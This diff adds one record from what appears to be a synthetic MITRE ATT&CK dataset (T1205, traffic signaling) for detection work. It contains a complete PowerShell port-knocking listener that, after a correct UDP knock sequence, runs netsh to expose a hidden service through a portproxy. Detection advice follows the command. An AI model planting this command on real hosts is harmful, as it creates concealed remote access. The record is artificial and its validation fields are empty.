@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$ports=@(2345,3456,4567);$clients=$ports|ForEach-Object{New-Object System.Net.Sockets.UdpClient($_)};$state=@{};while($true){foreach($c in $clients){if($c.Available -gt 0){$ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0);$b=$c.Receive([ref]$ep);$ip=$ep.Address.ToString();$idx=[array]::IndexOf($ports,$c.Client.LocalEndPoint.Port);if(($idx -eq 0) -or ($state[$ip] -eq ($idx-1))){$state[$ip]=$idx;if($state[$ip] -eq ($ports.Count-1)){& netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8081 connectaddress=127.0.0.1 connectport=8081;break}}}}Start-Sleep -Milliseconds 50}",
+  "explanation": "Implements a three-step UDP port-knock (2345 -> 3456 -> 4567) from the same source IP. When the sequence is correct, it exposes a hidden service by adding a netsh portproxy from 0.0.0.0:8081 to 127.0.0.1:8081. Requires Administrator due to portproxy configuration.",
+  "rationale_steps": [
+    "Listen on three UDP ports for a specific ordered knock sequence from the same sender.",
+    "On successful sequence, create a v4tov4 port proxy with netsh to reveal an internal service.",
+    "Detection: alert on creation of portproxy entries (registry HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\), process creation of netsh.exe with 'interface portproxy', and bursts of UDP packets to uncommon ports."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-acc1f0c7",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
